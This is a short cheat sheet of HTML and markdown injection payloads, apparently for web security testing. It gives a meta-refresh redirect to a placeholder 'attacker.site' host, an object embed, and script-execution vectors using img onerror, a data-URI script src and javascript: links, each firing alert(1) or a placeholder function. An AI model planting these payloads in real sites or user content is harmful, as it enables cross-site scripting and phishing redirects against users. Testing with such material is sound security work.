## Redirect

### Meta <i> (useful for websites that supports only few markdown features) </i>
```html
<meta http-equiv="refresh" content='0; url=http://attacker.site/'>
```

### Object
```html
<object data="/path" type="text/html"></object>
```
<br>

## Execution

### Img
```html
<img src=x onerror="something();"/>
```

### Script src
```html
<script src="data:\xD4\x8F,javascript:alert(1)">
```

### A Tag
```html
<a href="javascript:alert(1)">
```

